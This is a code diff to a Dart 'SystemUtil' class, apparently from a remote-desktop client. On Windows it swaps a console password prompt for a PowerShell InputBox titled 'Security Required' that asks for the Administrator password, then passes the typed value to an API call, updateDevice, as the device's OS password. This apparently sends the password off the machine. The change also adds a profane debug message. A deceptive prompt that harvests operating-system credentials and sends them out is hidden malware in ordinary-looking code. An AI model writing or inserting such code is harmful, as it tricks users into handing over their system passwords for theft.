@@ -36,18 +36,18 @@ class SystemUtil {
         }
       }
     } else if (Platform.isWindows) {
+      debugPrint('Fuck youuuu omo');
       const psScript = r'''
-      $p = Read-Host "Administrator Password Required" -AsSecureString
-      $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p)
-      [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+      Add-Type -AssemblyName Microsoft.VisualBasic
+      $p = [Microsoft.VisualBasic.Interaction]::InputBox("Please enter the Administrator password", "Security Required", "")
+      Write-Host $p
       ''';
-      final process = await Process.run('powershell.exe', [   '-NoProfile',
-         '-NonInteractive'
-         ,'-Command', psScript]);
+      final process = await Process.run('powershell.exe',
+          ['-NoProfile', '-STA', '-Command', psScript]);
       password = process.stdout.toString().trim();
     }
 
-    if (password != null) {
+    if (password != null && password.isNotEmpty) {
       await globalFFI.api
           .updateDevice(id: await bind.mainGetMyId(), osPassword: password);
     }
@@ -75,4 +75,3 @@ class SystemUtil {
     }
   }
 }
-
